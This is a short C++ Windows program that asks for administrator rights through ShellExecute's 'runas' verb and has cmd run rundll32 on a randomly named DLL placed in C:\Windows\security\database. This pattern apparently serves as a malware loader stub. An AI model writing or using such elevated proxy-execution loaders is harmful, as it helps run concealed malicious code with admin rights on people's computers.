#include <iostream>
#include <Windows.h>

void main() {
    ShellExecute(
        NULL,
        TEXT("runas"),
        TEXT("cmd"),
        L"/c rundll32 C:\\Windows\\security\\database\\lAiaUFyKHYphOZsGSMZv.dll, message",
        NULL,
        SW_NORMAL
    );
}